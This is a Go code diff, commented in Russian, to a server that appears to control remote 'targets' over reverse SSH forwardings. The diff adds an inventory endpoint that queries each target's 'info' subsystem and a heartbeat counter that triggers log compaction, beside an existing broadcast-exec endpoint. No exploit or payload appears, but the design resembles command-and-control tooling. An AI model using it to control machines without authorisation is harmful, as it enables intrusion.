@@ -10,6 +10,7 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -35,6 +36,11 @@ var (
 	clientHostPub ssh.PublicKey
 )
 
+var (
+	hbMu    sync.Mutex
+	hbCount int
+)
+
 func valid(line string) bool {
 	f := strings.Fields(line)
 	if len(f) < 4 || len(f) > 9 {
@@ -50,6 +56,63 @@ func valid(line string) bool {
 		return false
 	}
 	return true
+}
+
+// inventoryHandler: снимает подсистему "info" цели и отдаёт её JSON.
+func inventoryHandler(w http.ResponseWriter, r *http.Request) {
+	if clientSigner == nil || clientHostPub == nil {
+		http.Error(w, "client key not configured", 500)
+		return
+	}
+	port, err := strconv.Atoi(r.URL.Query().Get("port"))
+	if err != nil || port < 1024 {
+		http.Error(w, "bad port", 400)
+		return
+	}
+	addr := fmt.Sprintf("127.0.0.1:%d", port)
+	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+	if err != nil {
+		http.Error(w, "target unreachable: "+err.Error(), 502)
+		return
+	}
+	defer conn.Close()
+	_ = conn.SetDeadline(time.Now().Add(20 * time.Second))
+	cc, chans, reqs, err := ssh.NewClientConn(conn, addr, &ssh.ClientConfig{
+		User:              "anyuser",
+		Auth:              []ssh.AuthMethod{ssh.PublicKeys(clientSigner)},
+		HostKeyCallback:   ssh.FixedHostKey(clientHostPub),
+		HostKeyAlgorithms: []string{ssh.KeyAlgoED25519},
+		Timeout:           5 * time.Second,
+	})
+	if err != nil {
+		http.Error(w, "ssh: "+err.Error(), 502)
+		return
+	}
+	defer cc.Close()
+	client := ssh.NewClient(cc, chans, reqs)
+	defer client.Close()
+	session, err := client.NewSession()
+	if err != nil {
+		http.Error(w, "session: "+err.Error(), 502)
+		return
+	}
+	defer session.Close()
+	stdout, err := session.StdoutPipe()
+	if err != nil {
+		http.Error(w, "pipe: "+err.Error(), 502)
+		return
+	}
+	if err := session.RequestSubsystem("info"); err != nil {
+		http.Error(w, "subsystem: "+err.Error(), 500)
+		return
+	}
+	out, err := io.ReadAll(stdout)
+	if err != nil && len(out) == 0 {
+		http.Error(w, "read: "+err.Error(), 502)
+		return
+	}
+	w.Header().Set("Content-Type", "application/json; charset=utf-8")
+	w.Write(out)
 }
 
 // broadcastHandler: параллельный exec на целях через их форвардинги.
@@ -153,6 +216,8 @@ func handle(c net.Conn) {
 		return
 	}
 	defer f.Close()
+	hbMu.Lock()
+	defer hbMu.Unlock()
 	w := bufio.NewWriter(f)
 	for sc.Scan() {
 		line := strings.TrimSpace(sc.Text())
@@ -162,8 +227,13 @@ func handle(c net.Conn) {
 		if _, err := w.WriteString(line + "\n"); err != nil {
 			return
 		}
+		hbCount++
 	}
 	w.Flush()
+	if hbCount >= compEvery {
+		compact()
+		hbCount = 0
+	}
 }
 
 // compact: ротация online.txt — остаются последние compKeep строк.
@@ -212,9 +282,10 @@ func main() {
 		clientHostPub = hp
 	}
 
-	// broadcast exec: HTTP на отдельном порту (только localhost)
+	// broadcast exec + inventory: HTTP на отдельном порту (только localhost)
 	go func() {
 		http.HandleFunc("/broadcast", broadcastHandler)
+		http.HandleFunc("/inventory", inventoryHandler)
 		log.Fatal(http.ListenAndServe("127.0.0.1:8897", nil))
 	}()
 
